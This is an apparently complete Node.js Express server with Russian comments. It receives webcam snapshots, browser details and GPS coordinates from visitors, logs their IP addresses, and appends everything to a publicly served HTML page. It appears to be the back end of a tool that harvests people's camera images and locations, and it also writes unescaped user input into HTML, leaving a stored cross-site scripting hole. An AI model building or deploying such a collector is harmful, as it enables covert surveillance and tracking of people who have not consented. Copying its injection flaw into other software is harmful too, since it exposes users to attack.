const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json({ limit: '10mb' }));

// Middleware для извлечения IP-адреса пользователя
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    req.userIp = ip;
    next();
});

// Обработка загрузки изображения
app.post('/upload', (req, res) => {
    const { image, browser, location } = req.body;
    const userIp = req.userIp;

    // Декодирование base64 строки в буфер
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    // Определение пути к папке и файлу
    const uploadsDir = path.join(__dirname, 'uploads');
    const fileName = `snapshot_${Date.now()}.png`;
    const filePath = path.join(uploadsDir, fileName);

    // Проверяем, существует ли папка uploads, если нет - создаем её
    if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir);
    }

    // Сохраняем изображение
    fs.writeFile(filePath, buffer, (err) => {
        if (err) {
            console.error("Ошибка сохранения файла:", err);
            return res.status(500).send("Ошибка при сохранении изображения.");
        }

        // Логирование IP, браузера, местоположения и изображения в файл bebra.html
        const bebraFilePath = path.join(__dirname, 'public', 'bebra.html');
        const logEntry = `
            <div>
                <h3>IP: ${userIp}</h3>
                <p>Браузер: ${browser}</p>
                <p>Местоположение: Широта ${location.latitude}, Долгота ${location.longitude}</p>
                <img src="/uploads/${fileName}" alt="Снимок с камеры" width="640" height="480"/>
            </div>
        `;

        // Добавляем запись в файл bebra.html
        fs.appendFile(bebraFilePath, logEntry, (err) => {
            if (err) {
                console.error("Ошибка записи в bebra.html:", err);
                return res.status(500).send("Ошибка при обновлении bebra.html.");
            }

            console.log(`IP, браузер, местоположение и изображение добавлены в bebra.html: ${userIp}`);
            res.status(200).send("Изображение и данные успешно загружены.");
        });
    });
});

// Статическая папка для фронтенда и изображений
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Запуск сервера
app.listen(3000, () => {
    console.log('Сервер запущен на порту 3000');
});
